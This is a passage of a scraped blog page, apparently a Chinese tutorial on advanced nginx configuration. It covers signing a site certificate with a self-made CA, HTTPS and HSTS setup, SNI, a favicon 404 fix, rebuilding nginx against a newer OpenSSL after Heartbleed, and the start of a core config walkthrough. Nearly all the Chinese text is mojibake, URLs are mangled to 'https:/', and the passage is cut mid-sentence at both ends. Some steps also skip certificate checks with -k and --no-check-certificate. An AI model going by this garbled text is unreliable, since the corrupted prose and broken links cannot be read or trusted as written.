blank. ----- Country Name (2 letter code) [XX]:cn #å›½å®¶ State or Province Name (full name) []:sichuan #çœä»½ Locality Name (eg, city) [Default City]:chengdu #åŸå¸‚ Organization Name (eg, company) [Default Company Ltd]:nginx #å…¬å¸ Organizational Unit Name (eg, section) []:nginx.com #éƒ¨é—¨ Common Name (eg, your name or your server\u0026#39;s hostname) []:www.nginx.com #é€šç”¨å Email Address []:511670559@qq.com #é‚®ç®± Please enter the following \u0026#39;extra\u0026#39; attributes to be sent with your certificate request A challenge password []: An optional company name []: [root@centos7 certs]# ls www* www.nginx.com.csr www.nginx.com.key www.nginx.crt ##ä½¿ç”¨caç­¾å‘ç½‘ç«™çš„è¯ä¹¦www.nginx.crt [root@centos7 certs]# openssl x509 -req -days 3650 -in www.nginx.com.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out www.nginx.com.crt Signature ok subject=/C=cn/ST=sichuan/L=chengdu/O=nginx/OU=nginx.com/CN=www.nginx.com/emailAddress=511670559@qq.com Getting CA Private Key [root@centos7 certs]# ls ca.crt ca.key ca.srl www.nginx.com.crt www.nginx.com.csr www.nginx.com.key ##æŸ¥çœ‹è¯ä¹¦å†…å®¹ [root@centos7 certs]# openssl x509 -in www.nginx.com.crt -noout -text Certificate: Data: Version: 1 (0x0) Serial Number: f5:49:30:f5:10:2f:4b:ea Signature Algorithm: sha256WithRSAEncryption Issuer: C=cn, ST=sichuan, L=chengdu, O=nginx, OU=nginx.com, CN=www.nginx.com/emailAddress=22@qq.com Validity Not Before: Aug 4 14:48:57 2022 GMT Not After : Aug 1 14:48:57 2032 GMT Subject: C=cn, ST=sichuan, L=chengdu, O=nginx, OU=nginx.com, CN=www.nginx.com/emailAddress=511670559@qq.com Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (4096 bit) ... ## å°†caè¯ä¹¦å’Œç½‘ç«™è¯ä¹¦è¾“å‡ºåˆ°ä¸€ä¸ªæ–‡ä»¶ï¼ˆæ³¨æ„å‰åæ¬¡åºï¼‰ [root@centos7 certs]# cat www.nginx.com.crt ca.crt \u0026gt; www.nginx.com.pem https é…ç½® ##å‡†å¤‡ç«™ç‚¹é…ç½®æ–‡ä»¶ [root@centos7 certs]# cat /apps/nginx/conf.d/pc.conf server { listen 80; listen 443 ssl; server_name pc.test.org; location / { index index.html; default_type text/html; root html/pc; } ssl_certificate /apps/nginx/certs/www.nginx.com.pem; ssl_certificate_key /apps/nginx/certs/www.nginx.com.key; ssl_session_cache shared:sslcache:20m; } ##é‡å¯nginx [root@centos7 certs]# nginx -t nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok nginx: configuration file /apps/nginx/conf/nginx.conf test is successful [root@centos7 certs]# nginx -s reload æµè§ˆå™¨è®¿é—®æµ‹è¯•ï¼Œç”±äºæ˜¯è‡ªç­¾åè¯ä¹¦ï¼Œæµè§ˆå™¨å¹¶ä¸ä¿¡ä»»\nå®ç°å¤šåŸŸå https Nginx æ”¯æŒåŸºäºå•ä¸ªIPå®ç°å¤šåŸŸåçš„åŠŸèƒ½ï¼Œå¹¶ä¸”è¿˜æ”¯æŒå•IPå¤šåŸŸåçš„åŸºç¡€ä¹‹ä¸Šå®ç°HTTPSï¼Œå…¶å®æ˜¯åŸºäºNginxçš„ SNIï¼ˆServer Name Indicationï¼‰åŠŸèƒ½å®ç°ï¼ŒSNIæ˜¯ä¸ºäº†è§£å†³ä¸€ä¸ªNginxæœåŠ¡å™¨å†…ä½¿ç”¨ä¸€ä¸ªIPç»‘å®šå¤šä¸ªåŸŸåå’Œè¯ä¹¦çš„åŠŸèƒ½ã€‚å…¶å®ç°æµç¨‹æ˜¯å®¢æˆ·ç«¯åœ¨è¿æ¥åˆ°æœåŠ¡å™¨å»ºç«‹SSLé“¾æ¥ä¹‹å‰å…ˆå‘é€è¦è®¿é—®ç«™ç‚¹çš„åŸŸåï¼ˆHostnameï¼‰ï¼Œè¿™æ ·æœåŠ¡å™¨å†æ ¹æ®è¿™ä¸ªåŸŸåè¿”å›ç»™å®¢æˆ·ç«¯ä¸€ä¸ªåˆé€‚çš„è¯ä¹¦ã€‚\nç®€å•æ¥è¯´ï¼ŒSNIå®ç°äº†ä¸ºå¤šä¸ªè™šæ‹Ÿä¸»æœºé…ç½®å„è‡ªçš„httpsè®¤è¯åŠŸèƒ½ï¼Œé…ç½®æ–¹å¼å’Œä¸Šä¸€èŠ‚å†…å®¹ç±»ä¼¼ï¼Œè¿™é‡Œä¸åšæ¼”ç¤ºã€‚\næŸ¥çœ‹nginxæ”¯æŒSNIåŠŸèƒ½ï¼š\n[root@centos7 nginx]# nginx -V nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 TLS SNI support enabled #æ”¯æŒSNIåŠŸèƒ½ configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module --add-module=/usr/local/src/echo-nginx-module å®ç° HSTS å®˜æ–¹æ–‡æ¡£ï¼šhttps:/www.nginx.com/blog/http-strict-transport-security-hsts-and-nginx/\næœªé…ç½®httpè·³è½¬çš„æƒ…å†µæ—¶ï¼š\nå®ä¾‹ï¼š\n# ç«™ç‚¹é…ç½® [root@centos7 conf.d]# cat pc.conf server { listen 80; listen 443 ssl; ssl_certificate /apps/nginx/certs/www.nginx.com.pem; ssl_certificate_key /apps/nginx/certs/www.nginx.com.key; ssl_session_cache shared:sslcache:20m; ssl_session_timeout 10m; server_name pc.test.org; location / { index index.html; default_type text/html; root html/; } } #httpè®¿é—®æˆåŠŸ [root@centos7 conf.d]# curl www.test.org default #httpsè¯·æ±‚æŠ¥é”™ [root@centos7 conf.d]# curl www.test.org:443 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;400 The plain HTTP request was sent to HTTPS port\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;400 Bad Request\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;center\u0026gt;The plain HTTP request was sent to HTTPS port\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx/1.18.0\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; é…ç½®rewriteå®ç°httpè·³è½¬httpsåï¼š\nèŒƒä¾‹ï¼š\n##ç«™ç‚¹é…ç½® [root@centos7 conf.d]# cat pc.conf server { listen 80; listen 443 ssl; ssl_certificate /apps/nginx/certs/www.nginx.com.pem; ssl_certificate_key /apps/nginx/certs/www.nginx.com.key; ssl_session_cache shared:sslcache:20m; ssl_session_timeout 10m; server_name pc.test.org; add_header Strict-Transport-Security \u0026#34;max-age=31536000; includeSubDomains\u0026#34; always; #å¼€å¯å®¢æˆ·ç«¯ç¼“å­˜åŠŸèƒ½ï¼Œå½“å‘èµ·httpè¯·æ±‚æ—¶ä¼˜å…ˆè®¿é—®ç¼“å­˜ï¼Œç›´æ¥è¿›è¡Œæœ¬åœ°httpè·³è½¬ location / { index index.html; default_type text/html; root html/; #é…ç½®httpè·³è½¬https if ( $scheme = http ) { rewrite ^/(.*)$ https:/www.test.org/$1 redirect; } } } #å‘èµ·httpè¯·æ±‚ï¼Œè¿”å›å“åº”ç ä¸º302 [root@centos7 conf.d]# curl pc.test.org \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;302 Found\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;302 Found\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx/1.18.0\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; [root@centos7 conf.d]# curl pc.test.org -L #è·Ÿè¸ª302é‡å®šå‘ååˆæŠ¥è¯ä¹¦æ ¡éªŒé”™è¯¯ curl: (60) Peer\u0026#39;s certificate issuer has been marked as not trusted by the user. More details here: http:/curl.haxx.se/docs/sslcerts.html curl performs SSL certificate verification by default, using a \u0026#34;bundle\u0026#34; of Certificate Authority (CA) public keys (CA certs). If the default bundle file isn\u0026#39;t adequate, you can specify an alternate file using the --cacert option. If this HTTPS server uses a certificate signed by a CA represented in the bundle, the certificate verification probably failed due to a problem with the certificate (it might be expired, or the name might not match the domain name in the URL). If you\u0026#39;d like to turn off curl\u0026#39;s verification of the certificate, use the -k (or --insecure) option. # å‘èµ·httpè¯·æ±‚ï¼Œè‡ªåŠ¨è·³è½¬httpsæˆåŠŸ [root@centos7 conf.d]# curl pc.test.org -kL #è·Ÿéšé‡å®šå‘å¹¶å¿½ç•¥è¯ä¹¦å®‰å…¨æ€§æ£€æŸ¥ï¼Œè¯·æ±‚æˆåŠŸ default å…³äº favicon.io favicon.ico æ–‡ä»¶æ˜¯ç½‘ç«™æ ‡ç­¾é¡µçš„å°å›¾æ ‡ï¼Œå½“å®¢æˆ·ç«¯ä½¿ç”¨æµè§ˆå™¨é—®é¡µé¢æ—¶ï¼Œæµè§ˆå™¨ä¼šè‡ªå·±ä¸»åŠ¨å‘èµ·è¯·æ±‚è·å–é¡µé¢çš„favicon.icoæ–‡ä»¶ï¼Œä½†æ˜¯å½“æµè§ˆå™¨è¯·æ±‚çš„favicon.icoæ–‡ä»¶ä¸å­˜åœ¨æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè®°å½•404æ—¥å¿—ï¼Œè€Œä¸”æµè§ˆå™¨ä¹Ÿä¼šæ˜¾ç¤º404æŠ¥é”™\nå›¾æ ‡ä½ç½®ï¼š\næŠ¥é”™å¦‚ä¸‹ï¼š\n[root@centos7 nginx]# tail -1 logs/error.log # æ—¥å¿—ä¸­çš„æŠ¥é”™ 2022/08/05 17:47:54 [error] 2604#0: *200 open() \u0026#34;/apps/nginx/html/favicon.ico\u0026#34; failed (2: No such file or directory), client: 172.16.16.1, server: pc.test.org, request: \u0026#34;GET /favicon.ico HTTP/1.1\u0026#34;, host: \u0026#34;pc.test.org\u0026#34;, referrer: \u0026#34;http:/pc.test.org/\u0026#34; [root@centos7 nginx]# ls /apps/nginx/html/favicon.ico # æ–‡ä»¶ç¡®å®ä¸å­˜åœ¨ ls: cannot access /apps/nginx/html/favicon.ico: No such file or directory è§£å†³æ–¹æ¡ˆï¼š\n#å°†è‡ªå·±çš„å›¾æ ‡å‘½ä»¤ä¸ºfavicon.icoæ”¾ç½®äºæŒ‡å®šç›®å½•ä¸‹ [root@centos7 html]# wget https:/gitee.com/favicon.ico -P /apps/nginx/html/ [root@centos7 html]# ll /apps/nginx/html/favicon.ico -rw-r--r-- 1 root root 41566 Jun 10 11:59 /apps/nginx/html/favicon.ico è®¿é—®æµ‹è¯•ï¼ˆæµè§ˆå™¨æŒ‰å¿«æ·é”® CTRL+F5 å¼ºåˆ¶åˆ·æ–°ï¼‰\nOpenSSLç‰ˆæœ¬å‡çº§ OpenSSLç¨‹åºåº“å½“å‰å¹¿æ³›ç”¨äºå®ç°äº’è”ç½‘çš„ä¼ è¾“å±‚å®‰å…¨ï¼ˆTLSï¼‰åè®®ã€‚å¿ƒè„å‡ºè¡€ï¼ˆHeartbleedï¼‰ï¼Œä¹Ÿç®€\nç§°ä¸ºå¿ƒè¡€æ¼æ´ï¼Œæ˜¯ä¸€ä¸ªå‡ºç°åœ¨åŠ å¯†ç¨‹åºåº“OpenSSLçš„å®‰å…¨æ¼æ´ï¼Œæ­¤æ¼æ´äº2012å¹´è¢«å¼•å…¥äº†è½¯ä»¶ä¸­ï¼Œ\n2014å¹´4æœˆé¦–æ¬¡å‘å…¬ä¼—æŠ«éœ²ã€‚åªè¦ä½¿ç”¨çš„æ˜¯å­˜åœ¨ç¼ºé™·çš„OpenSSLå®ä¾‹ï¼Œæ— è®ºæ˜¯æœåŠ¡å™¨è¿˜æ˜¯å®¢æˆ·ç«¯ï¼Œéƒ½å¯\nèƒ½å› æ­¤è€Œå—åˆ°æ”»å‡»ã€‚æ­¤é—®é¢˜çš„åŸå› æ˜¯åœ¨å®ç°TLSçš„å¿ƒè·³æ‰©å±•æ—¶æ²¡æœ‰å¯¹è¾“å…¥è¿›è¡Œé€‚å½“éªŒè¯ï¼ˆç¼ºå°‘è¾¹ç•Œæ£€\næŸ¥ï¼‰ï¼Œå› æ­¤æ¼æ´çš„åç§°æ¥æºäºâ€œå¿ƒè·³â€ï¼ˆheartbeatï¼‰ã€‚è¯¥ç¨‹åºé”™è¯¯å±äºç¼“å†²åŒºè¿‡è¯»ï¼Œå³å¯ä»¥è¯»å–çš„æ•°æ®æ¯”åº”è¯¥å…è®¸è¯»å–çš„è¿˜å¤šã€‚\nèŒƒä¾‹ï¼šå‡çº§OpenSSLè§£å†³å®‰å…¨æ¼æ´\n[root@centos7 ~]# nginx -V nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 #å½“å‰OpenSSLç‰ˆæœ¬ TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module --add-module=/usr/local/src/echo-nginx-module ##ä¸‹è½½è¾ƒæ–°ç‰ˆæœ¬OpenSSLæºç åŒ… [root@centos7 ~]# cd /usr/local/src/ [root@centos7 src]# wget https:/www.openssl.org/source/openssl-1.1.1h.tar.gz --no-check-certificate [root@centos7 src]# tar xf openssl-1.1.1h.tar.gz ##ç¼–è¯‘å®‰è£…OpenSSL [root@centos7 src]# cd /usr/local/src/nginx-1.18.0/ [root@centos7 nginx-1.18.0]# ./configure --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module --add-module=/usr/local/src/echo-nginx-module --with-openssl=/usr/local/src/openssl-1.1.1h #æ³¨æ„OpenSSLè·¯å¾„è¦æ·»åŠ æ­£ç¡® [root@centos7 nginx-1.18.0]# make \u0026amp;\u0026amp; make install #è¯­æ³•æ£€æŸ¥é€šè¿‡ [root@centos7 nginx-1.18.0]# nginx -t nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok nginx: configuration file /apps/nginx/conf/nginx.conf test is successful [root@centos7 nginx-1.18.0]# nginx -V nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.1.1h 22 Sep 2020 #ç‰ˆæœ¬å‡çº§æˆåŠŸ TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module --add-module=/usr/local/src/echo-nginx-module --with-openssl=/usr/local/src/openssl-1.1.1h ","permalink":"https://senmer.github.io/zh/posts/tech/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/","summary":"\u003cp\u003eNginx é«˜çº§é…ç½®åŠç¬¬ä¸‰æ–¹æ¨¡å—\u003c/p\u003e","title":"Nginxé«˜çº§é…ç½®"},{"content":"ä¸»è¦ä»‹ç»Nginxæ ¸å¿ƒé…ç½®æ–‡ä»¶\né…ç½®æ–‡ä»¶è¯´æ˜ nginx å®˜æ–¹æ–‡æ¡£ï¼šhttp://nginx.org/en/docs/\nnginx é…ç½®æ–‡ä»¶ç»„æˆï¼š ä¸»é…ç½®æ–‡ä»¶ï¼š nginx.conf å­é…ç½®æ–‡ä»¶ï¼š conf.d/*.conf fastcgi,ï¼Œ uwsgiï¼Œscgi ç­‰åè®®çš„ç›¸å…³é…ç½®æ–‡ä»¶ mime.typesï¼šæ”¯æŒçš„mimeç±»å‹ï¼ŒMIMEï¼ˆMultipurpose Internet Mail Extensionsï¼‰å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ï¼ŒMIMEæ¶ˆæ¯èƒ½åŒ…å«æ–‡æœ¬ã€å›¾åƒã€éŸ³é¢‘ã€è§†é¢‘ä»¥åŠå…¶ä»–åº”ç”¨ç¨‹åºä¸“ç”¨çš„æ•°æ®ï¼Œæ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“å¸¦æœ‰æŸç§æ‰©å±•åçš„æ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ‰“å¼€ï¼ˆæ¯”å¦‚ï¼šåº”ç”¨ç¨‹åºä¼šè¢«ä¸‹è½½ï¼Œæ–‡æœ¬æ–‡ä»¶ä¼šç›´æ¥æ˜¾ç¤ºå†…å®¹ï¼‰ã€‚ç®€å•æ¥è¯´ï¼ŒMIMEå°±æ˜¯åˆ©ç”¨æ‰©å±•åæ ‡è¯†æ–‡ä»¶ç±»å‹ï¼Œç„¶åæ ¹æ®æ–‡ä»¶çš„ç±»å‹åšå“åº”çš„å¤„ç†ã€‚MIME å‚è€ƒæ–‡æ¡£ï¼šhttps://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types nginx é…ç½®æ–‡ä»¶æ ¼å¼è¯´æ˜ï¼š é…ç½®æ–‡ä»¶ç”±æŒ‡ä»¤å’ŒæŒ‡ä»¤å—æ„æˆ æ¯æ¡æŒ‡ä»¤ä»¥åˆ†å·ï¼›ç»“æŸï¼ŒæŒ‡ä»¤å’Œå€¼ä¹‹é—´ä»¥ç©ºæ ¼åˆ†éš” å¤šæ¡æŒ‡ä»¤å¯ä»¥æ”¾åœ¨åŒä¸€è¡Œï¼Œä»¥åˆ†å·åˆ†éš”ã€‚ä½†å¯è¯»æ€§å·®ï¼Œä¸æ¨èè¿™æ ·é…ç½® æŒ‡ä»¤å—ä»¥{ } æ‹¬å·ä½œä¸ºå¼€å§‹å’Œç»“æŸçš„æ ‡è¯†ï¼Œå°†å¤šæ¡æŒ‡ä»¤ç»„ç»‡åœ¨ä¸€èµ·ï¼Œä¸”æ”¯æŒåµŒå¥— å¯é€šè¿‡includeå¼•å…¥å…¶ä»–é…ç½®æ–‡ä»¶å†…å®¹ï¼Œæå‡é…ç½®æ–‡ä»¶çš„å¯ç»´æŠ¤æ€§ï¼ˆå¦‚å­é…ç½®æ–‡ä»¶conf.d/*.conf) é…ç½®æ–‡ä»¶ä½¿ç”¨# ä½œä¸ºæ³¨é‡Šç¬¦ï¼Œä½¿ç”¨$å¼•ç”¨å˜é‡ éƒ¨åˆ†æŒ‡ä»¤çš„å‚æ•°æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼ nginx ä¸»é…ç½®æ–‡ä»¶æŒ‡ä»¤æ ¼å¼ï¼š directive value [value1 ...]; è¯´æ˜ï¼š 1ã€æŒ‡ä»¤å¿…é¡»ä»¥åˆ†å·ï¼›ç»“æŸ 2ã€æ”¯æŒå˜é‡ï¼š 1ï¼‰å†…å»ºå˜é‡ï¼šç”±Nginxæ¨¡å—å¼•å…¥ï¼Œå¯ç›´æ¥å¼•ç”¨ 2ï¼‰è‡ªå®šä¹‰å˜é‡ï¼šç”±ç”¨æˆ·ä½¿ç”¨setæŒ‡å®šå®šä¹‰ï¼Œæ ¼å¼ï¼š set variable_name value; 3) å¼•ç”¨å˜é‡çš„æ–¹å¼ï¼š$variable_name ä¸»é…ç½®æ–‡ä»¶ç»“æ„ï¼šå››éƒ¨åˆ† main blockï¼šä¸»é…ç½®æ®µï¼Œå³å…¨å±€é…ç½®æ®µï¼Œå¯¹http,mailéƒ½æœ‰æ•ˆ #äº‹ä»¶é©±åŠ¨ç›¸å…³çš„é…ç½® event { ... } #http/https åè®®ç›¸å…³é…ç½®æ®µ http { ... } #é»˜è®¤é…ç½®æ–‡ä»¶ä¸åŒ…æ‹¬ä¸‹é¢ä¸¤ä¸ªå— #mail åè®®ç›¸å…³é…ç½®æ®µ mail { ... } #stream æœåŠ¡å™¨ç›¸å…³é…ç½®æ®µ stream { ... } é»˜è®¤çš„nginx.conf é…ç½®æ–‡ä»¶è¯´æ˜\n##å…¨å±€é…ç½®å—ï¼Œå¯¹å…¨å±€ç”Ÿæ•ˆã€‚ä¸»è¦è®¾ç½®nginxçš„å¯åŠ¨ç”¨æˆ·/ç»„ï¼Œå¯åŠ¨çš„å·¥ä½œè¿›ç¨‹æ•°é‡ï¼Œå·¥ä½œæ¨¡å¼ï¼Œnginxçš„pidæ–‡ä»¶è·¯å¾„ç­‰ã€‚ user nginx nginx; worker_processes 1; #å¯åŠ¨å·¥ä½œè¿›ç¨‹çš„æ•°é‡ï¼Œä¸€èˆ¬ä¸CPUæ ¸å¿ƒæ•°ä¸€è‡´ ##eventså—ï¼Œä¸»è¦å½±å“nginxæœåŠ¡å™¨ä¸ç”¨æˆ·çš„ç½‘ç»œè¿æ¥ï¼Œæ¯”å¦‚æ˜¯å¦å…è®¸åŒæ—¶æ¥å—å¤šä¸ªç½‘ç»œè¿æ¥ï¼Œä½¿ç”¨å“ªç§äº‹ä»¶é©±åŠ¨æ¨¡å‹ï¼Œæ¯ä¸ªå·¥ä½œè¿›ç¨‹æœ€å¤§æ”¯æŒå¹¶å‘è¿æ¥æ•°ï¼Œæ˜¯å¦å¼€å¯å¯¹å¤šå·¥ä½œè¿›ç¨‹ä¸‹çš„ç½‘ç»œè¿æ¥è¿›è¡Œåºåˆ—åŒ–ç­‰ã€‚ events { worker_connections 1024; #å•ä¸ªworkerè¿›ç¨‹çš„æœ€å¤§å¹¶å‘è¿æ¥æ•°ã€‚ä½œä¸ºwebæœåŠ¡å™¨æ—¶ï¼Œnginxçš„æœ€å¤§å¹¶å‘æ•°ä¸ºï¼šworker_connections * worker_processesã€‚ä½œä¸ºåå‘ä»£ç†çš„æ—¶å€™ä¸ºï¼ˆworker_connections * worker_processesï¼‰/2 } ##httpå—æ˜¯nginxæœåŠ¡å™¨é…ç½®ä¸­çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œç¼“å­˜ã€ä»£ç†å’Œæ—¥å¿—æ ¼å¼å®šä¹‰ç­‰ç»å¤§å¤šæ•°åŠŸèƒ½å’Œç¬¬ä¸‰æ–¹æ¨¡å—éƒ½åœ¨è¿™é‡Œé…ç½®ã€‚httpå—å¯ä»¥åŒ…å«å¤šä¸ªserverå—ï¼Œè€Œä¸€ä¸ªserverå—åˆå¯ä»¥åŒ…å«å¤šä¸ªlocationå—ï¼Œserverå—å¯ä»¥é…ç½®æ–‡ä»¶å¼•å…¥ã€MIME-Typeå®šä¹‰ã€æ—¥å¿—è‡ªå®šä¹‰ã€æ˜¯å¦å¯ç”¨sendfileã€è¿æ¥è¶…æ—¶æ—¶é—´å’Œå•ä¸ªé“¾æ¥çš„è¯·æ±‚ä¸Šé™ç­‰ã€‚ http { include\tmime.types; default_type application/ostet-stream; sendfile\ton; #ä½œä¸ºwebæœåŠ¡å™¨æ—¶æ‰“å¼€sendfileåŠ å¿«é™æ€æ–‡ä»¶ä¼ è¾“ï¼ŒæŒ‡å®šæ˜¯å¦ä½¿ç”¨sendfileç³»ç»Ÿè°ƒç”¨ä¼ è¾“æ–‡ä»¶ã€‚sendfileç³»ç»Ÿè°ƒç”¨åœ¨ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¹‹é—´ç›´æ¥ä¼ é€’æ•°æ®ï¼ˆå®Œå…¨åœ¨å†…æ ¸ç©ºé—´è¿›ç¨‹ï¼‰ï¼Œä»è€Œé¿å…äº†æ•°æ®åœ¨å†…æ ¸ç¼“å†²åŒºå’Œç”¨æˆ·ç¼“å†²åŒºä¹‹é—´çš„æ‹·è´ï¼Œæ•ˆç‡å¾ˆé«˜ï¼Œæ˜¯é›¶æ‹·è´æŠ€æœ¯çš„ä¸€ç§ã€‚ keepalive_timeout 65; #é•¿è¿æ¥è¶…æ—¶æ—¶é—´ï¼Œå•ä½ï¼šç§’ ##serverå—å¯ç”¨äºé…ç½®è™šæ‹Ÿä¸»æœºï¼Œæœ‰è‡ªå·±çš„å…¨å±€é…ç½®ï¼Œå¯ä»¥åŒ…å«å¤šä¸ªlocationå—ã€‚å¯é…ç½®æœ¬è™šæ‹Ÿæœºç›‘å¬çš„ç«¯å£ï¼Œè®¾ç½®è™šæ‹Ÿæœºåç§°ï¼Œå¤šä¸ªserverç›‘å¬åŒä¸€ä¸ªç«¯å£ã€‚ server { listen 80; #ç›‘å¬ç«¯å£ server_name;\tlocalhost; #serverçš„åŸŸåï¼Œé…ç½®å¤šä¸ªè™šæ‹Ÿä¸»æœºæ—¶ç”¨åˆ° location / { root\thtml; index\tindex.html index.htm; #ç½‘ç«™é»˜è®¤ä¸»é¡µ } error_page 500 502 503 504 /50x.html; #é”™è¯¯é¡µé¢ ##locationå¤„ç†å¯¹åº”çš„ä¸åŒé”™è¯¯ç çš„é¡µé¢å®šä¹‰åˆ°50x.htmlï¼ŒæŒ‡ç¤ºäº†50.htmlæ–‡ä»¶æ‰€åœ¨ç›®å½• location = /50x.html { root\thtml; #é”™è¯¯é¡µé¢æ–‡ä»¶æ‰€åœ¨ç›®å½• } } ##å’Œé‚®ä»¶ç›¸å…³çš„é…ç½® #mail { # ... #} mail åè®®ç›¸å…³é…ç½®æ®µ #tcpä»£ç†é…ç½®ï¼Œ1.9ç‰ˆæœ¬ä»¥ä¸Šæ”¯æŒ #stream { # ... #} stream æœåŠ¡å™¨ç›¸å…³é…ç½®æ®µ #å¯¼å…¥å…¶ä»–è·¯å¾„çš„é…ç½®æ–‡ä»¶ #include /apps/nginx/conf.d/*.conf } å…¨å±€é…ç½® main å…¨å±€é…ç½®å—å¸¸è§çš„é…ç½®æŒ‡ä»¤åˆ†ç±»\næ­£å¸¸è¿è¡Œå¿…å¤‡çš„é…ç½® ä¼˜åŒ–æ€§èƒ½ç›¸å…³çš„é…ç½® ç”¨äºè°ƒè¯•å®šä½é—®é¢˜ç›¸å…³çš„é…ç½® äº‹ä»¶é©±åŠ¨ç›¸å…³çš„é…ç½® å…¨å±€é…ç½®è¯´æ˜ user\tnginx nginx; #å¯åŠ¨nginxå·¥ä½œè¿›ç¨‹çš„ç”¨æˆ·å’Œç»„ worker_processes [number | auto]; #å¯åŠ¨nginxå·¥ä½œè¿›ç¨‹çš„æ•°é‡ï¼Œä¸€èˆ¬å’ŒCPUæ ¸å¿ƒæ•°ç›¸åŒ worker_cpu_affinity 00000001 00000010 00000100 00001000; #å°†Nginxå·¥ä½œè¿›ç¨‹ç»‘å®šåˆ°æŒ‡å®šçš„CPUæ ¸å¿ƒï¼Œé»˜è®¤Nginxæ˜¯ä¸è¿›è¡Œè¿›ç¨‹ç»‘å®šçš„ï¼Œç»‘å®šå¹¶ä¸æ˜¯æ„å‘³ç€å½“å‰nginxè¿›ç¨‹ç‹¬å ä»¥ä¸€æ ¸å¿ƒCPUï¼Œä½†æ˜¯å¯ä»¥ä¿è¯æ­¤è¿›ç¨‹ä¸ä¼šè¿è¡Œåœ¨å…¶ä»–æ ¸å¿ƒä¸Šï¼Œè¿™å°±æå¤§å‡å°‘äº†nginxçš„å·¥ä½œè¿›ç¨‹åœ¨ä¸åŒçš„cpuæ ¸å¿ƒä¸Šçš„æ¥å›è·³è½¬ï¼Œå‡å°‘äº†CPUå¯¹è¿›ç¨‹çš„èµ„æºåˆ†é…ä¸å›æ”¶ä»¥åŠå†…å­˜ç®¡ç†ç­‰ï¼Œå› æ­¤å¯ä»¥æœ‰æ•ˆçš„æå‡nginxæœåŠ¡å™¨çš„æ€§èƒ½ã€‚ CPU MASK: 00000001ï¼š0å·CPU 00000010ï¼š1å·CPU 10000000ï¼š7å·CPU ##ç¤ºä¾‹: [root@test conf]# egrep \u0026#34;processes|affinity\u0026#34; nginx.conf worker_processes 4;\t#å¯åŠ¨å››ä¸ªworkerè¿›ç¨‹ worker_cpu_affinity 0001 0010; #å°†workrè¿›ç¨‹ç»‘å®šåˆ° 0å·CPUå’Œ1å·CPU [root@test conf]# lscpu | grep CPU\\(s\\) # CPUæ ¸æ•°ä¸º2 CPU(s): 2 On-line CPU(s) list: 0,1 NUMA node0 CPU(s): 0,1 [root@test conf]# nginx -t #è¯­æ³•æ£€æŸ¥å‡ºç°è­¦å‘Šï¼Œå› ä¸ºworkerè¿›ç¨‹æ•°æ¯”CPUæ ¸å¿ƒæ•°å¤šã€‚å¤šå‡ºçš„workerè¿›ç¨‹å°†ç»‘å®šåœ¨â€˜ä¸Šä¸€ä¸ªCPUæ ¸å¿ƒâ€˜ä¹Ÿå³0010ä¸Šã€‚å¯¹äºâ€˜ä¸Šä¸€ä¸ªCPUæ ¸å¿ƒâ€™ï¼ˆlast mask for remaining workerï¼‰çš„è§£é‡Šï¼š processesï¼šnginxåˆ†åˆ«å°†workerè¿›ç¨‹ç»‘å®šåˆ°worker_cpu_affinity æŒ‡å®šçš„CPUæ 